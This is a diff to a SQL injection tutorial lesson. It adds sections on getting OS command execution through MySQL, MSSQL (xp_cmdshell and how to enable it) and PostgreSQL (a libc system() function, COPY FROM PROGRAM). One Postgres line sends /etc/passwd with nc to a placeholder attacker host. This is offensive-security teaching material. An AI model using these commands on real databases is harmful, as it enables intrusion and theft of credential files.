@@ -1,4 +1,4 @@
-# FOOTHOLD AND S.O. EXPLOITING FROM SQL INJECTION - LESSON 03
+# FOOTHOLD AND S.O. EXPLOITATION FROM SQL INJECTION - LESSON 03
 
 Once we discovered and successfully exploited an SQLi we have, in some
 specific case, the opportunity to access portions of the operating system.
@@ -196,3 +196,54 @@ The file must be a world writable file.
 This is what we always want, or not?
 This ability allow us to start a privilege escalation on the server, using the
 server as pivot and much much more.
+
+### RCE IN MySQL
+Mysql does not natively support shell command execution.
+The faster way to obtain RCE in MySQL is with file writing as we seen in the
+previous chapter.
+
+### RCE IN MSSQL
+As always, with MSSQL we can get the best satisfaction :D
+MSSQL provides `xp_cmdshell` that allow us to execute commands:
+
+```sql
+EXEC master.dbo.xp_cmdshell 'cmd';
+```
+
+On modern versions of MSSQL `xp_cmdshell` is disabled by default...but it can be
+activated through some query:
+
+```sql
+EXEC sp_configure 'show advanced options', 1;
+EXEC sp_configure reconfigure;
+EXEC sp_configure 'xp_cmdshell', 1;
+EXEC sp_configure reconfigure;
+```
+
+There are also other techniques in MSSQL that allow us to execute commands (
+see the [gracefulsecurity cheatsheet](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)).
+
+### RCE IN POSTGRES
+In PostegreSQL we can rely on the presence of Libc to execute commands
+directly through the database:
+
+```sql
+ CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;
+ SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');
+ ```
+
+ We are defining a new function that calls `system` on the libc.
+ The only requirement is the knowledge of the location of the libc on the system.
+ This is a privileged command.
+
+ Alternatively we can abuse the `COPY` function:
+
+ ```sql
+ CREATE TABLE cmd_exec(cmd_output text);
+ COPY cmd_exec from program 'whoami';
+ SELECT * from cmd_exec;
+ ```
+
+ This code creates a `cmd_exec` table, `COPY` the output from program `whoami`
+ (this is the real code execution) to the table just created.
+ The last command allows us to display the output of the command.
